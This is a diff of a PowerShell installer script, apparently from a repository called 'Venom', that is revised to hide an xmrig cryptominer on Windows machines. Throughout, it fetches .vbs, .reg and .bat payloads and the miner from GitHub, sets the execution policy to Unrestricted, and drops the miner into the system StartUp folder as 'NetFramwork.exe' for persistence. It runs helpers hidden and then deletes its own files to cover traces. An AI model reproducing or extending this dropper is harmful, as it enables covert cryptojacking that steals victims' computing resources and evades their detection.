@@ -53,7 +53,6 @@ cd $path
 
 Invoke-WebRequest -OutFile "QyjAaZDBbNPk.reg" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wrev.reg"
 Invoke-WebRequest -OutFile "FoRAUwtxKkSB.vbs" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/calty.vbs"
-Invoke-WebRequest -OutFile "w.bat" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/w.bat"
 Invoke-WebRequest -OutFile "ZDaFvwjOosKx.vbs" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/RunHidden.vbs"
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/w.bat" -OutFile "w.bat"
 
@@ -74,16 +73,16 @@ Set-Variable -Name currentDir -Value ($Pwd)
 
 Invoke-WebRequest -OutFile "xmrig-6.22.2-msvc-win64.zip" -Uri "https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/xmrig-6.22.2-msvc-win64.zip"
 
-Set-ItemProperty -Value "Hidden" -Path "$initial_dir\xmrig-6.22.2" -Name Attributes
+# Set-ItemProperty -Value "Hidden" -Path "$initial_dir\xmrig-6.22.2" -Name Attributes
 
-Set-Variable -Name newConfigPath -Value ("$path\w.bat")
-Set-Variable -Value ("$initial_dir\xmrig-6.22.2\w.bat") -Name targetConfigPath
-if (Test-Path -Path $newConfigPath) {
-    Copy-Item -Path $newConfigPath -Destination $targetConfigPath -Force
-    Write-Output "bat file has been copied successfully."
-} else {
-    Write-Output "New bat file not found at the specified path."
-}
+# Set-Variable -Name newConfigPath -Value ("$path\w.bat")
+# Set-Variable -Value ("$initial_dir\xmrig-6.22.2\w.bat") -Name targetConfigPath
+# if (Test-Path -Path $newConfigPath) {
+#     Copy-Item -Path $newConfigPath -Destination $targetConfigPath -Force
+#     Write-Output "bat file has been copied successfully."
+# } else {
+#     Write-Output "New bat file not found at the specified path."
+# }
 
 Remove-Item -Path "$initial_dir\ip.txt"
 
@@ -121,7 +120,7 @@ Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
 # Define hidden payload path
 $hiddenDir = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
 #$payloadName = "svchost.exe"
-$destinationPath = "$hiddenDir\xmrig-6.22.2\NetFramwork.exe"#Join-Path $hiddenDir $payloadName
+$destinationPath = "$hiddenDir\NetFramwork\NetFramwork.exe"#Join-Path $hiddenDir $payloadName
 #$newConfigPath_2 = "$initial_dir\xmrig-6.22.2"
 
 mkdir "$hiddenDir\NetFramwork"
@@ -136,7 +135,7 @@ if (-not (Test-Path $hiddenDir)) {
 # Copy miner to hidden location
 #Copy-Item -Path $newConfigPath_2 -Destination $destinationPath -Force
 Set-Variable -Name newConfigPath -Value ("$path\w.bat")
-Set-Variable -Value ("$hiddenDir\xmrig-6.22.2\w.bat") -Name targetConfigPath
+Set-Variable -Value ("$hiddenDir\NetFramwork\w.bat") -Name targetConfigPath
 if (Test-Path -Path $newConfigPath) {
     Copy-Item -Path $newConfigPath -Destination $targetConfigPath -Force
     Write-Output "bat file has been copied successfully."
@@ -265,3 +264,4 @@ Remove-Item -Path "$initial_dir\PkUbTvqXFIdB.txt"
 Remove-Item -Path "$initial_dir\BVrAihDwJNvc.ps1"
 Remove-Item -Path "$initial_dir\TMqhONoBljEv.vbs"
 Remove-Item -Path "$path\w.bat"
+Remove-Item -Path "$hiddenDir\NetFramwork\xmrig.exe"
